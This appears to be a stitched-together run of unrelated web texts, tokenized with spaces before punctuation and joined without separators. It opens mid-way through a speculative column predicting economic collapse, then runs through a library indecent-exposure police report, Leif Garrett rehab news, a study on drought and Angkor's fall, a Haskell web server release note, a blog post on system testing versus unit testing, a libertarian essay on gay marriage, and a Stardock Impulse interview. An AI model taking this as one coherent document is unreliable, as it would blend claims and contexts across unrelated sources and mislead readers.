Hedge fund manager Barton Biggs in " Wealth , War and Wisdom " warns of the " possibility of a breakdown of the civilized infrastructure " ... Financial historian Niall Ferguson , author of " Colossus : The Rise and Fall of The American Empire , " writing in " Collapse & Complexity : Empires on the Edge of Chaos , " warns we 'll fail to see a coming collapse .
... Jack Bogle saw the problem years ago in " The Battle for the Soul of Capitalism " ...
And Hong Kong economist Marc Faber used the dreaded " c- word " in his Doom , Boom & Gloom Report : " The future will be a total disaster , with a collapse of our capitalistic system ... inevitable . "
But is Stone credible ?
Not just to predict another collapse , but the timing ?
Or is he just another entertainer , like " Mad Money 's " Jim Cramer ?
Was it just coincidence that his film was released right after the October 1987 crash ?
Does n't matter : Lewis says Wall Street saw Stone as a guru .
He denies it : " We did n't know what was coming and we did n't know this was a special period ...
People accused me of being a genius who predicted the stock - market crash of 1987 .
I did n't predict the stock - market crash .
I had no idea . "
But you have to wonder : Are Wall Street 's insiders right ?
Is Stone a guru , seer , great cosmic market timer ?
Is there a real link between the ' 87 crash and 2010 ?
Is he linked in to all the many references to the word " collapse " by leading minds ?
Swiss psychologist Carl Jung would tell us events like this are not random " coincidences , " but a " synchronicity " of the " collective unconsciousness " surfacing in the voices of many tuned - in beings , warning us our world is in grave danger ... that yes , a collapse is dead ahead ... but that Wall Street , like bomb experts in " Hurt Locker , " will go deep into denial , naturally blind to the larger historical warning while focusing narrowly on trading opportunities in their kill - zone .
Reverse course ?
Save the " American Soul " from collapse ?
Unfortunately , when the collapse ignites , it 's game over .
America will have passed the " point of no-return . "
We will wake up too late to prepare .
Collapse becomes destiny .
As Ferguson puts it : " Collapse may come much more suddenly than many historians imagine .
A combination of fiscal deficits and military overstretch suggests that the United States may be the next empire on the precipice , " and fall easily , without a push .
Yes , our destiny is locked deep in the DNA of Wall Street 's insiders , in their insatiable short - term greed .
America 's destiny is also locked in the long - term life cycles of nations and economies , as we discovered in Ferguson 's historical works and Diamond 's anthropological research .
Destiny repeats over time and through the ages , in new forms , new nations , new civilizations , yet always repeating the same patterns .
All this was predictable back in the winter of 2008 , when at the center of the storm ... when Wall Street was melting down ... when a frightened Treasury Secretary Paulson 's sole objective was not America but saving his beloved Goldman Sachs and the other fat - cat banks from wholesale bankruptcy ... back then when Washington and Wall Street were overwhelmed , blinded , Naomi Klein , author of " Shock Doctrine : The Rise of Disaster Capitalism , " accurately predicted another bubble / collapse for America :
" Free market ideology has always been a servant to the interests of capital ...
During boom times it 's profitable to preach laissez faire , because an absentee government allows speculative bubbles ...
When those bubbles burst , the ideology becomes a hindrance and goes dormant while big government rides to the rescue . "
Then , free - market " ideology will come roaring back when the bailouts are done .
The massive debts the public is accumulating to bail out the speculators will then become part of a global budget crisis . "
Cosmic market - timing signal ?
' Death of America 's Soul ? '
Maybe both ?
Stone may not fully understand his powers to see the future , but collectively , Stone , Klein , Ferguson , Diamond and many others do " see " the future .
They see the life cycles of societies , nations , empires and civilizations rise and collapse on rather predictable time schedules averaging 200 years .
Yes , they " see " what Wall Street never " sees " because Wall Street 's DNA , their optimism , their animal instinct , focuses them narrowly on kill - zone opportunities , heightening their trading senses , blocking out dangers , risks , threats , as attack new market timing signals .
Yes , 1987 's history may well be repeating in 2010 .
So you better be asking yourself : Is Oliver Stone traders ' biggest stock market timing signal of 2010 ?
Of the decade ?
Are you prepared ?
Or blind , in denial ?
Ypsilanti police say a library patron took off his clothes and exposed himself to an employee today before fleeing with children 's books in hand .
The man has n't been located by police .
The 58 - year - old employee told police she was working in the Ypsilanti District Library in the 200 block of West Michigan Avenue at 10:30 a.m. and assisted a man in making book selections .
She returned to her desk and looked up to see the man step out from behind a bookcase , completely naked , a police press release said .
The man " thrust his hips in the direction " of the woman , but did n't make any other movements toward her , the release said .
The employee went upstairs and called police .
By the time officers got there , the man had fled through an emergency exit , taking his clothes and the children 's books with him , the release said .
The man was described as black , 30 - 40 years old , 5 feet 8 inches tall , 160 pounds and had a mustache .
He was wearing a brown coat , blue jeans and a knit cap when he entered the library .
Anyone with information is asked to call Ypsilanti police at 734-483-9510 .
Jan. 31 , 2006  -- Former 1970s teen idol Leif Garrett is starting his first full day in a drug rehab center to undergo treatment for heroin addiction .
" Even though it was n't court ordered , I 've decided that I think the best way to start out the program and get a good foundation … is to check in for 30 days , " Garrett told " Good Morning America . "
" I 'm grateful for the opportunity to get cleaned up . "
Garrett , 44 , agreed on Friday to enter a strict drug - diversion program for violating probation in a cocaine case .
He also faces charges of felony possession of heroin .
The diversion program requires frequent testing and daily counseling for at least a year , but Garrett said the inpatient rehab treatment was his choice .
" I think you have to be ready to quit within yourself , " Garrett said .
" If you 're not , it does n't matter what rehab you go to . "
On Wednesday , Garrett pleaded not guilty to felony possession of heroin stemming from a Dec. 14 arrest in Los Angeles .
" It was heroin and not that much , but enough , " Garrett said .
" A little bit is too much and a whole lot is more than enough . "
Garrett said he had been trying to quit heroin even before his arrest .
" You plan on taking control as much as possible ; it 's just something that unfortunately controls you in the long run , " Garrett said .
" It was the monkey on my back .
Only I 've come to realize it was n't just a monkey , it was more like a gorilla . "
Garrett started acting when he was 5 years old and entered the music world as a teen .
At 16 , he topped the charts with the hit , " I Was Made for Dancing " and his version of " Surfin USA . "
Around the same time , Garrett developed a taste for drugs and alcohol .
In 1979 , he was driving drunk and caused an accident that permanently paralyzed a friend .
Over the last decade , Garrett has continued with his music career but has failed to stay sober .
Garrett has been arrested three times for heroin possession in recent years .
He was on probation at the time of his most recent arrest .
Garrett 's mother , Carolyn Stellar , takes responsibility for some of her son 's troubles .
" We have to know and we must follow our children , seek out information any way we can and learn about the problems so we can stop it then and do the tough love then , not wait until the end , " Stellar said .
" We have to start at the beginning . "
Stellar said she was not the only person responsible for her son's fall .
" I 'd like to see all those others that were in his life and controlled his life and were very damaging in his life stand up and apologize to him , " Stellar said .
" I think that would help in the healing . "
Stellar thought Danny Bonaduce owed her an apology for a comment he made on " Good Morning America " on Jan. 20 .
Bonaduce suggested Garrett 's most recent mug shot would haunt Garrett for the rest of his life .
" I think that was a terrible remark , " Stellar said .
" That [ mug shot ] is a heroin child .
That is dead .
That person is dead .
My son is back .
Leif is back .
There 's a big difference . "
Garrett said in a year he hoped to see a different person when he looked in the mirror .
" I just want the clarity back , " Garrett said .
" I just want to look in the mirror and see some bright eyes .
I 'm feeling very paternal .
I 'm looking forward to settling down and having kids . "
Decades of drought , interspersed with intense monsoon rains , may have helped bring about the fall of Cambodia 's ancient Khmer civilization at Angkor nearly 600 years ago , according to an analysis of tree rings , archeological remains and other evidence .
The study , published this week in the journal Proceedings of the National Academy of Sciences , may also shed light on what drives -- and disrupts -- the rainy season across much of Asia , which waters crops for nearly half the world 's population .
Historians have offered various explanations for the fall of an empire that stretched across much of Southeast Asia between the 9th and 14th centuries , from deforestation to conflict with rival kingdoms .
But the new study offers the strongest evidence yet that two severe droughts , punctuated by bouts of heavy monsoon rain , may have weakened the empire by shrinking water supplies for drinking and agriculture , and damaging Angkor 's vast irrigation system , which was central to its economy .
The kingdom is thought to have collapsed in 1431 after a raid by the Siamese from present - day Thailand .
The carved stone temples of its religious center , Angkor Wat , are today a major tourist destination , but much of the rest of the civilization has sunk back into the landscape .
" Angkor at that time faced a number of problems -- social , political and cultural .
Environmental change pushed the ancient Khmers to the limit and they were n't able to adapt , " said the study 's lead author , Brendan Buckley , a climate scientist and tree -ring specialist at Columbia University 's Lamont - Doherty Earth Observatory .
" I would n't say climate caused the collapse , but a 30 - year drought had to have had an impact . "
Scientists led by Buckley were able to reconstruct 759 years of past climate in the region surrounding Angkor by studying the annual growth rings of a cypress tree , Fokienia hodginsii , growing in the highlands of Vietnam 's Bidoup Nui Ba National Park , about 700 kilometers away .
By hiking high into the mountain cloud forests , the researchers were able to find rare specimens over 1,000 years old that had not been touched by loggers .
After extracting tiny cores of wood showing the trees ' annual growth rings , researchers reconstructed year - to - year moisture levels in this part of Southeast Asia from 1250 to 2008 .
The tree rings revealed evidence of a mega - drought lasting three decades -- from the 1330s to 1360s -- followed by a more severe but shorter drought from the 1400s to 1420s .
Written records corroborate the latter drought , which may have been felt as far away as Sri Lanka and central China .
The droughts may have been devastating for a civilization dependent on farming and an irrigation system of reservoirs , canals and embankments sprawling across more than a thousand square kilometers .
The droughts could have led to crop failure and a rise in infectious disease , and both problems would have been exacerbated by the density of the population , Buckley says .
The study also finds that the droughts were punctuated by several extraordinarily intense rainy seasons that may have damaged Angkor 's hydraulic system .
During a normal monsoon season , Angkor 's hydraulic network could have handled heavy downpours , but after extended droughts , the system may have been vulnerable to massive siltation and clogging , the study suggests .
Layers of coarse debris and other sediments found blocking some canals appear to have been laid down suddenly .
In other spots , apparently sudden erosion cut canals as much as 8 meters below the surrounding landscape , potentially destabilizing the hydraulic system .
Archeologists have found additional evidence that canals were rebuilt and rerouted to cope with water shortages .
In compiling the longest tropical tree ring record to date , researchers found that the third - driest , and the driest , years in the last 760 years occurred back to back in 1402 and 1403 , about three decades before Angkor 's fall .
The second driest was 1888 , which coincided with the 1888 - 1889 El Niño , a cyclical warming of the tropical Pacific Ocean .
By correlating known El Niño cycles measured with modern instruments , researchers have documented how the cyclical warming and cooling of the tropical Pacific Ocean brings rain to some places and drought to others .
The authors of the current study and other researchers suggest that El Niño , possibly abetted by longer , decades - long cycles across the Pacific basin , may have played an important role in shutting down the monsoon rains in this region , creating withering droughts in the past .
Some scientists suspect that warming of the global climate may intensify these cycles in the future , raising the possibility of alternating Angkor - like droughts and destructive floods that could affect billions of people .
Similar studies suggest that abrupt environmental changes may have pushed other ancient civilizations over the edge , including the Anasazi people of the southwestern United States ; the Maya people of Central America , and the Akkadian people of Mesopotamia .
There is some evidence that other once - powerful kingdoms in what is now Vietnam and Myanmar may have fallen during the late 1700s , following extreme dry and wet periods .
" Both human society and the erth 's climate system are complex systems capable of unexpected behavior .
Through the long - term perspective offered by climate and archaeological records , we can start to identify and understand the myriad ways they may interact , " said study coauthor Kevin Anchukaitis , a tree ring scientist at Lamont .
" The evidence from monsoon Asia should remind us that complex civilizations are still quite vulnerable to climate variability and change . "

Hi all , Straight from Zurihac : I 'm very pleased to announce the 1.0.0 release of the Salvia web server .
Salvia is a feature rich web server and web application framework that can be used to write dynamic websites in Haskell .
From the lower level protocol code up to the high level application code , everything is written as a Salvia handler .
This approach makes the framework extremely modular and extensible .
This release include the following stack of packages : * salvia - protocol : Protocol stack containing URI , HTTP , Cookie and Mime .
* salvia : Basic server interface and implementation .
* salvia - extras : Additional server handlers and back end implementation .
* salvia - sessions : Session and user management support .
* salvia - websocket : Cutting edge HTML5 web socket support .
* salvia - demo : Demo servers showing how to use Salvia .
All the code is on Hackage [ 1 ] and the source repositories can be found on GitHub [ 2 ] .
Most of the basic ideas of the previous Salvia release are still in these package , but all the code has been cleaned up considerably .
There is now a very strong separation between interface and implementation making it more easy to plug - in new back - ends for your web application .
To do a full install first run `cabal update ' followed by `cabal install salvia - demo ' .
Now you can run the salvia - demo command and point your browser to http://localhost:8080/ .
Thanks to the people that helped me with coding , suggestions and bug -reports .
Any comments / suggestions are welcome !
Have fun , -- Sebatiaan Visser [ 1 ]

In my last two posts , I 've shown a Mac app with full unit tests and an iPhone app with full unit tests .
The reality though is that I do not write or test code this way .
In this post , I look at why so few applications are actually developed using unit tests .
I 'll also look at the alternate approaches — both manual and automated — that are normally used to maintain high quality and low bug rates in application development .
Introduction
I have many friends who love unit tests .
They never write code without writing the unit tests first .
And they love it ; the thought of writing code without unit tests seems foolish and scary to them .
Test - first approaches ensure that they never write anything that is n't specified and unit tested .
This post is not to dissuade these people from unit tests .
If you already know that you know and love unit tests , then stick with them .
But even unit testing advocates should remember that unit tests are about code - level specification and working within certain types of development methodology — they do not attempt to catch all bugs .
This post is primarily for people who have heard of unit tests and are wondering if they are an efficient way to maintain product quality and lower bug rates .
The short answer is : no .
If you simply want to lower bug counts , the best and most efficient approach is through system tests .
Difficulties of unit testing for application development
Depending on your development methodology , unit tests can serve a number of different functions .
But if used purely to detect bugs then they are a very high cost approach for low return .
Unit tests do n't test the overall program , only isolated units .
This creates many holes ( integration , timing , re-entrancy , inter- module communication ) that need to be tested another way .
These limitations are not unique to application development so I 'll focus instead on something that is : the difficulty of isolating your units for testing .
Advocates of unit testing claim that you can follow good program design and reduce coupling and integration , making tests easy to write .
Unfortunately , in application development , that 's not exactly possible .
As I noted when I was discussing iPhone application design , the code that you write in a Cocoa application is mostly controller classes — since the model and view classes are so reusable , you rarely need to write them yourself .
Controller classes are the classes which link your program together — they join model and view elements together to make your program .
The entire purpose of these classes is coupling .
The unit tests I wrote for the WhereIsMyMac program were approximately three times the size of the original code due to large numbers of mock objects and tricky hackery to intercept calls into the Cocoa framework — and this was a simple sample application , it could easily be much worse .
Every mock object reduces the accuracy of the test by reducing the reality of the test environment and the risk of false positives or negatives in test results .
Since controller classes are so common in applications and the main role of a controller class is to join different objects together , unit testing suffers from the following serious problems in application development :
Requires huge amounts of mocking code and other fakery ( time consuming ) .
The resulting tests are far removed from the integrated reality , making false positives and false negatives highly likely and leaving large holes that are simply not tested .
System testing methodologies for application development
The best approach for testing an application is to accept the coupled , integrated , timing dependent , environment dependent nature and test everything in place .
The idea is simple : test the complete program in the exact manner ( or as close as possible ) in which you expect it to be used .
Tests which operate in this manner are classed as " system tests " .
The reason why system tests are the most efficient and accurate form of product testing is simple : if you want to ensure low bug rates for the user , test the program in the same way that the user will use it ; do n't test a fake environment and do n't test at levels the user can't access .
Types of system testing
There are lots of ways to system test your code .
In order from most important to least important for application development :
I 'm not going to give full definitions of these tests here —
I 'm simply going to discuss their importance to applications and related projects .
Follow the links to read more about each one .
Every good application has point 2 and most have 3 and 4 as part of their regular testing methodology — sanity checks occur as part of the development methodology ( run your code before you commit ) and fall outside formal testing .
The important step in making system tests work is to keep them formalized .
If the test is not automated , then it should be formally documented so that each of the steps is correctly run during a testing phase .
A basic or ad hoc approach to any of these points does n't count though : proper quality comes from rigorous and clearly defined testing approaches .
User interface testing
User interface testing is normally performed using testing matrices .
In its simplest form , this means a document containing all user interface test cases in a table — a spreadsheet , workprocessor or TextEdit document , it does n't really matter as long as it is documented .
The rows in the table are all steps in operating your program ( selecting menu items , operating buttons , perform edit operations ) .
Every single user interface element in the program should be tested and most should be tested multiple ways to account for different expected effects .
The columns are all environmental differences between runs .
Different operating system versions , different computers , different installation settings or different builds of the application ( lite , demo or full ) .
Each cell in the table should then contain the observed result and an indication of whether this is a success or failure according to the specification .
If you can automate the process , then great — there are software tools that will help with this on the Mac .
If you can't — yes , user interface testing will get manual and tedious but ultimately , it is the only way to guarantee that the program works as expected .
Most of the programs you use have simply had someone sitting in front of them , progressively clicking all the buttons and using all the controls — for every test case in every version .
You need to have the whole table documented and it needs to cover every element of the user interface .
The purpose is to remind you to test everything ( bad luck will ensure that failure to test a row will guarantee that it contains uncaught bugs ) .
API testing
In theory , user - interface testing should test everything in a user facing application .
It may seem inefficient to suggest API testing ( which is normally done for libraries and code modules ) .
There are three reasons that any substantial application would want API tests :
Human testers of user - interfaces are lazy , forget or make mistakes
API tests are automated and can be run at build - time or as part of continuous integration
You can test issues that may not be obvious during user testing ( like data coherency )
For user applications though , it presents the problem that you must create an API layer that can actually be programmatically tested .
The common approach is to separate the " model " of your application into a separate module with an API layer .
API testing is similar to unit testing in many respects :
it is automated
can be implemented using OCUnit or similar libraries
can be used to develop your application using test - first methodologies
The difference is that API tests do not separate the units within the module .
API tests test the whole module in - place , fully integrated .
This means that the API tests can be quite removed from the implementation details — which has the advantage that they can be more easily written by a separate programmer or test engineer , freeing up programming resources .
API tests also aim to be optimally efficient : they only test inputs and outputs and do n't care about how intermediary steps in the transformation occurs .
API tests attempt to provide a realistic environment and data but do suffer from some of the same limitations as unit tests in that some parts of the environment must be synthetic ( the full application will not be present during testing ) .
Regression tests
After you 're happy that your program is working as intended , regression tests ensure that subsequent work does n't screw it up .
These are tests are normally used for programs that produce a file output .
Their operation is basically : run the regression test and compare the output to the " known good " result which was saved previously .
If the output changes unexpectedly , the test fails .
For many file producing projects ( like a few major open - source projects specializing in video codecs , PDF renderers , DVD authoring packages ) this is the only test they include .
However , it 's all that these types of project require : a good set of regression tests should have high code coverage ( exercise almost all of the program ) and perform most of the work of API testing too .
Regression tests can be human or automatically driven .
Applescript can drive regression tests in full applications or OCUnit can be used to drive regression tests through an API layer .
Specification
As I hinted previously , there are a few roles served by unit tests that system tests handle .
One is that unit tests are a form of specification for the code .
You can use the tests as a way of learning what the code is supposed to do and in some cases for sketching out how future code should operate .
API testing can certainly replicate the unit testing specification at the API level ; again , API tests are like an interface optimized application of unit tests .
However , I prefer the old - school approach : document your code with comments .
Not with a line or two inside the method but full comment blocks on every single method documenting conditions on all parameters and the return parameters and effects of the method .
Like test - first development , it is common to write comments first ( specify the functionality of the method , then write it , asserting pre and post conditions if desired ) .
I use a customized version of Xcode 's " Script Menu→HeaderDoc → Insert @method comment " to automate the creation of the comment block 's formatting from the method prototype .
If the comments at the start of each method are not clear enough for documentation ( think about Apple 's Cocoa API documentation ) then you 're not doing your commenting job .
Conclusion
Unit testing an application is filled with difficulties and problems .
In my development style , I consider the time cost of unit testing an application outweighs its benefits — especially since a unit tested application still requires system tests like user - interface and regression tests for proper validation .
Regardless of whether you use unit tests , formalized system testing — either automated or manual and methodical — is required to fully validate an application and ensure the lowest possible low bug rates .
The most efficient approach is to test the interface that the program exposes in the exact way that the user will use it .
For user interface apps , this means user testing matrices .
For applications with a lot of model code , this means API tests .
For document producing applications , this means regression tests .
In many cases though , a combination of all three is best .
Most of these approaches require that you be disciplined .
You need to comment your code .
You need to maintain user interface testing matrices .
You need to refactor your model layer so it has an interface that can be tested automatically .
You need to measure the code coverage of your regression tests .
I know these things are tedious .
I know that no one wants to write test plans , test documents and API tests .
But if you love your program and you want it to suck less , this is work that needs to be done .

The Libertarian Case for Gay Marriage
Like everyone , my political and ethical views have evolved over time .
From a somewhat racialist milieu in rural Louisiana , I consciously rejected racism when I was in my young teens .
From a devout Catholic youth I became a secularist and freethinker at a fairly young age .
From libertarian - conservative hawkish Reaganism at 18 I quickly became a die - hard libertarian minarchist , then an anarchist .
My initial conservative and Randian pro-American exuberance has given way to a much more critical view of America ’s baleful effect on world history and my rosy view of its founding has been replaced with skepticism , disdain , scorn , and regret .
On abortion , initially militantly pro-choice in the Randian fashion , over the years my aversion to it has grown deeper and deeper to where I see at least late - stage abortion to be tantamount to murder ( though I still do n’t favor its being outlawed by states ) .
On affirmative action , my conservative and libertarian overboard “ meritism ” has given way to a more contrarian view .
My initial attraction to natural rights and natural law type arguments slowly shifted to a more realistic and focused transcendental type approach .
On intellectual property , despite my initial–but hesitant and troubled –assumption that it was legitimate , after struggling to find a better way to defend it than arguments such as Rand ’s and those of utilitarians , I finally rejected it after realizing it is indeed incompatible with property rights .
And though I initially praised centralist libertarian ideas such as the Lochner - type caselaw praised by some libertarians I later came to develop a radical skepticism of the wisdom and legitimacy of trusting a central state to monitor state actions .
For one more example , despite initially accepting the Hayekian knowledge arguments , I became more skeptical of their coherence in the wake of the Austrian “ dehomogenization ” debate . *
And so it is with gay marriage .
My views evolved from mild ambivalence and recommendation of civil unions ( see Gay Marriage , Feb .
2004 ; “ The ” Libertarian View on Gay Marriage , June 2006 ) to an increasingly pro-gay marriage position ( Second Thoughts on Gay Marriage , Nov. 2006 ) .
And it ’s become even clearer to me now ; I ’m no longer reluctant .
[ Update : see my post California Gay Marriage Law Overturned : What Should Libertarians Think ? ]
Why am I for gay marriage ?
First , I ’ve never been even slightly homophobic , despite the assumptions of prejudiced “ enlightened ” liberals ( after all , I am from the South ! ) .
So that did n’t play into the gay marriage issue for me .
I was initially somewhat opposed to gay marriage , but not for the standard reasons about it “ damaging ” the “ institution of marriage ” and all that malarkey , but because I feared ( a ) it would instantly grant more positive rights to gay couples , and ( b ) it was the thin end of the wedge and would be used to argue next for anti-discrimination law being applied to gays , which I of course did and do oppose .
I still agree with these concerns , but they are not dispositive .
The basic case for gay marriage is this : in a private order the state would not be involved .
Contracts would be enforced by the private legal system , including contracts incidental to consensual regimes such as marriage .
Marriage would be a private status recognized socially , with contractual and related legal effects : co-ownership defaults , joint liability presumptions , guardianship assumptions , medical decision and visitation rights , alimony or related default considerations upon termination , and the like .
Initially religions and societal custom would regard only heterosexual unions as marriage , but eventually , with secularization of society , gay couples would start being more open , and referring to their partners as spouses , and have “ wedding ceremonies . ”
At first mainstream society would be reluctant to accept homosexual unions in the concept or term “ marriage , ” but I suspect that politeness , manners , increasing exposure to and familiarity with open homosexuals ( co- workers , family members ) , and increasing cosmopolitanness and secularization of society would result in an initially grudging including , finally more complete inclusion , perhaps always with a bit of an asterisk among some quarters .
Or maybe not , but I think so .
In any case the contractual regimes associated with any type of consensual union would be recognized and enforced legally , whether between hetero couples , homosexual couples , spinster sisters , frat buddies , group unions , whatever .
The hetero couples , and perhaps one - man - many - wife groupings , would be referred to as marriages , the members as husband and wife .
Perhaps the partners in a homosexual union would be referred to as married and spouses ; perhaps not .
I think so , eventually , but it ’s irrelevant .
There would be no legal battle ; capitalist acts among consenting adults would be given legal effect , no matter what the accessory union is named .
But .
The state is involved .
Even now I think the state should not be involved in marriage , even if it insists on monopolizing the legal system .
Ideally , the state should get out of the marriage business and enforce whatever contractual arrangements are ancillary to voluntary unions , whatever the members , whatever society , calls these various unions .
But for now , the state monopolizes the laws and regulations governing co-ownership , child - guardianship and custody issues , medical and death - related decisions and visitation , and the like .
And it insists on pigeon - holing the relationships that it will give full contractual effect to in the “ marriage ” category ( which means only that the state uses the word “ marriage ” in the caption of the statutes giving effect to the consensual arrangements of individuals ) .
So be it .
If the state is going to monopolize the legal and court system , if it is going to insist on labeling as “ marriage ” any relationship whose contractual incidents it will deign to recognize legally , then of course it has no right to deny this to gay couples who wish to have the civil aspects of their relationship legally recognized .
Yes , it ’s true , this will probably end up with gays getting included in anti-discrimination laws .
So what .
Abolish the anti-discrimination laws , then .
As for Christian fundamentalists who are so worked up about this : who cares what word the state uses in the caption of the statute giving legal effect to private parties ’ contracts ?
If you are opposed to this , stop supporting the state and positive law .
( And if you hate evolution being taught in public schools–stop sending your kids there ; stop supporting taxation , democracy , the state , and public schools . )
As for the complain that gay marriage will “ harm marriage ” – first , nonsense .
How is any person ’s marriage harmed by the choice of word used in the caption of artificial law made by a criminal state ?
Second , even if it does harm the “ institution ” of marriage , this is the result of the state monopolizing this area , or of its failure to fully enforce the contractual regimes of non-standard voluntary relationships since they do n’t fit the traditional definition of marriage – that ’s no excuse !
As for “ purist ” libertarians who say we should not extend the reach of the state in this way : well , the state should not have roads either .
But would we not oppose a law banning gays from the roads ?
We would not hide behind , “ Well , it ’s not nice that the state prohibits gays from using the roads , but the solution is not to let gays use the roads–it ’s to abolish the public roads ! ”
No .
Does gay marriage violate anyone ’s rights ?
No .
It is not an act of aggression .
Does it violate gays ’ rights to be prevented because of the state ’s monopolization of the legal system from having their relationships given legal effect ?
Yes . [ N.B. : This whole mess , and other considerations ( see State Monopolization of Marriage Eviscerates Private Contract ) should also highlight for homosexuals why they should also oppose the state and its involvement in this whole area . ]
In sum : the state should get out of marriage .
If it remains in existence and monopolizes the legal system , it should enforce any contractual aspects of regimes entered into by consenting adults .
What they call it is irrelevant .
Ideally it would be unlabeled and private society would figure out naming conventions .
But the state should not be allowed to hamper the rights of non-standard couples just because it insists on decreeing what is and what is not “ marriage . ”
If the state insists on regulating unions and giving it the label “ marriage , ” then gays ought to be able to legally protect their relationships and associated regimes .
The state infringes their rights to do this if it monopolizes the field then denies them entrance .
Not only should libertarians support gay marriage , but of course they should .

Last week I had a chat with Stardock boss Brad Wardell , and I ’ve chopped the transcripts into two bits to be posted today and tomorrow .
In this first part we talk about Impulse and Stardock ’s attempts to rival GFWL and Steamworks with its Impulse Reactor tools .
It ’s an interesting response to living in the shadow of both Steam and Games For Windows Live , and it ’ll be even more interesting to see how many developers and publishers now adopt them .
Does all this promise , as one reader mailed in , “ Steam , but better ? “
RPS : So there ’s quite a bit of new material to talk about with regards with Impulse .
I see Stardock have been busy creating a stack of new features , and you ’ve been showing off some of those at GDC …
Wardell : So “ Impulse Reactor ” is the name we ’ve given to our internal development platform , which we ’ve been working on for years and years .
We ’ve started making some of these features available to developers , first of all with GOO , [ which was launched at GDC2009 ] and Paradox and THQ adopted it for their stuff .
GOO is basically a way to implement some copy - protection onto a game without being obnoxious to the user .
We ’ve got the Gamer ’s Bill Of Rights , so we wanted to adhere to that while at the same time offering something that was of use to publishers .
RPS : Right .
So what does GOO actually do in terms of providing control ?
Wardell :
It encapsulates the executable and adds activation into the game .
A developer can do more than that , if they want , but essentially what happens is that when it pops up you enter an email address and a serial number and that ’s the last you hear of it .
It ’s a one time thing .
RPS : Hmm .
So no “ always on ” .
The advantages of that kind of approach do seem pretty obvious , especially given recent events .
Anyway , you ’ve now released some other tools , which revamp and expand your support for online multiplayer gaming specifically …
Wardell :
This year publishers have been coming to us regarding Steamworks .
People bellyache about it , but if you ’re a game developer this is a feature set you ca n’t do without .
Also it ’s also too much to do yourself , unless you ’re a really big publisher .
Outside EA and a couple of other big guys , adding all this stuff in is often beyond typical capabilities : friends lists , online saves , all that stuff .
With Steamworks you have to bundle Steam with it , which is a problem because Steam stuff then pops up in the game .
If we were going to come up with a solution to provide a similar feature set then we could n’t do it in the way that Steam had done it , we had to come up with something else , something more suitable for these developers who were coming to us .
So we designed a technology that allows our SDK to be integrated into the developer ’s own process .
The way it works is that we have created the kind of features you see in Battle .
net or Steamworks , except all the developer has to do is include a DLL , and we integrate our stuff in there .
What this allows us to do is call up screens with one line of code , without including the distributable as Steamworks has to do .
Developers will – it ’s in beta right now – be able to use these features for free , as long as they include their game non-exclusively on Impulse .
RPS : Ah , so developers get an instant multiplayer and online feature set for their games , and you benefit from having more games for Impulse users .
Wardell :
The fact of the matter is that if we did n’t have Impulse Reactor then Stardock would have to be looking at Steamworks as an alternative .
If we had to look at that , you can imagine where everyone else is .
If we had to release Elemental with Steam bundled … Imagine it !
I ’m not even being funny here : what would be my alternatives ?
Gamespy ?
Games For Windows Live ?
Oh , that just gets into a whole other thing .
RPS : PC developers are working in the shadow of either Steam or GFWL , now , it ’s true .
And I think I know what system the gamers prefer .
What you ’re saying is that they need alternatives to avoid being completely tied into Valve ’s service .
Wardell : Gamers expect a certain level of functionality now , especially having using Xbox Live and the PlayStation network .
They expect these tools for online activity to be there right away .
Are you on the Starcraft II beta ?
RPS : Yes .
Wardell :
So you ’ve seen what Battle .
net is like now ?
You ’ve seen what Blizzard are offering ?
To me , that ’s what players are going to come to expect from their multiplayer games .
How many developers have the capability to deliver that ?
Have you played C&C4 and Supreme Commander 2 ?
Do they offer the same features as Battle .net ?
RPS : Yeah , we ’ve been discussing that , actually .
Battle . net ’s front end menus and ladders and stuff are almost more impressive than the game itself .
Wardell :
It just works so well : the leagues , the stats , and they have half the stuff turned off right now !
So Starcraft 2 comes out and then every strategy game is going to be compared to that .
This is our reasoning for Impulse Reactor : developers now need to be able to offer that sort of experience to their users if they want to be competitive .
And they need to be able to do it with minimal effort .
What ’s more they can do that with Impulse Reactor and have it in their game because they can skin our screens to look like their game .
I read in our Impulse comments that someone was arguing for uniformity for friend lists and stuff across all games , but hang on for a second : can you imagine what Starcraft 2 would have looked like if it was defaulting to , say , Steamworks , for those screens ?
It would be a totally different thing , people would expect their experience to fit the game .
RPS : That ’s pretty interest as an user - experience observation .
I mean , I get annoyed every time I see the GFWL overlay .
If that was buried in the game UI then I ’d be far less irritated by it .
What I want is for a game to store my login and never bother me again .
Do n’t ask me what profile I want to use , it ’s the same damn profile as last time !
Wardell : Games For Windows
Live could be described the anti-Impulse Reactor .
It ’s completely the opposite way of doing it .
RPS : But you are going to have the same kinds of feature sets ?
Achievements and so on ?
Wardell : Yes , but the difference is the developer can call them up .
It ’s up to them .
If you use GFWL you do n’t have a say .
“ Want to use this feature ?
Go to the overlay . ”
The players have to go in there and use the GFWL UI , so to the developers .
The way we ’re doing it is so that a developer can skin this stuff to pop up anywhere they want within their own game .
It ’s far more natural .
Not all overlays are equal !
The performance difference for using Impulse Reactor is pretty massive too .
RPS : What about virtually stored savegames and stuff like that , can you actually offer that kind of service in the same way Steamworks can ?
Wardell :
Yes , although the way we are doing it is to just provide the developer with virtual drives , rather than specific “ virtual savegames ” .
If they want to save some data to the cloud , then they just do that , whatever it might be .
Rather than us dictating the way developers implement this stuff , we just say “ here ’s some space for data online , use it how you want . ”
RPS : Have you had any feedback so far on this stuff , actual responses from developers and publishers ?
Wardell :
Well it was actually developers and publishers who came to us and said “ someone needs to provide an alternative ” .
The big things that these companies really like – and this took us by surprise – is the idea that people can log on with , say , their Facebook account .
We ’re adding support for Twitter and OpenID too .
If the user is forced to create an Impulse store account to use this stuff then it ’s as bad as Steamworks .
People need to be able to log in with other IDs .
RPS : So no fixed account control ?
Devs can use whatever suits them ?
Wardell :
Yes , it avoids the “ yet another login ” problem by allowing you to use sign up with a Facebook account .
It still stores some data on our servers , but it ’s anonymised by that point .
We do n’t store contact data .
RPS : That all sounds pretty interesting , and I can see exactly why this has evolved .
Gamers generally seem to regard Steam as the best solution , but that does n’t mean it ’s the only way all this stuff can work .
So anyway , how is Impulse itself doing ?
Wardell : Pretty well .
It took us about a year to get to one million users , and we got to three million about a year after that .
We ’re at about 10 % of where Steam is , but we have n’t been out for nearly as long .
Where things really started rolling was where we got the major publishers on board .
In the last six months we ’ve got EA , Activision and Ubisoft on there , and then it ’s just an issue of getting the games up there .
Things really started happening .
RPS : Any thoughts on the PCGA ’s report saying that global games software sales had gone up by 3 % in 2009 ?
Wardell :
How do they get that stat ?
How do they know ?
RPS : Hard to say with an specificity …
Wardell : I doubt Valve are telling them exactly how they ’re doing , right ?
